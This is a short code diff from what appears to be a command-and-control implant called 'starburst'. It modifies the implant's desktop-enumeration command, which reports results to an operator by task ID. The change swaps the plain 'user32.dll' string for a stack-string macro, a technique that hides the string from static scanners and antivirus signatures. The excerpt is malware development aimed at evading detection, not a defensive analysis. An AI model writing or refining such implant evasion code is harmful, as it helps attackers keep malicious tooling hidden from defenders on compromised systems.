@@ -4,6 +4,7 @@
 #include <parser.h>
 #include <config.h>
 #include <strings.h>
+#include <stackstr.h>
 
 #ifdef INCLUDE_CMD_ENUMDESKTOPS
 
@@ -80,7 +81,8 @@ auto declfn starburst::cmd_enumdesktops(
 
     DBG_PRINT( inst, "cmd_enumdesktops\n" );
 
-    auto h_user32 = inst.kernel32.LoadLibraryA( symbol<const char*>( "user32.dll" ) );
+    STK_USER32(_n);
+    auto h_user32 = inst.kernel32.LoadLibraryA( _n );
     if ( !h_user32 ) {
         queue_response( inst, task_uuid, RESPONSE_ERROR,
             symbol<char*>( const_cast<char*>( "failed to load user32.dll" ) ) );
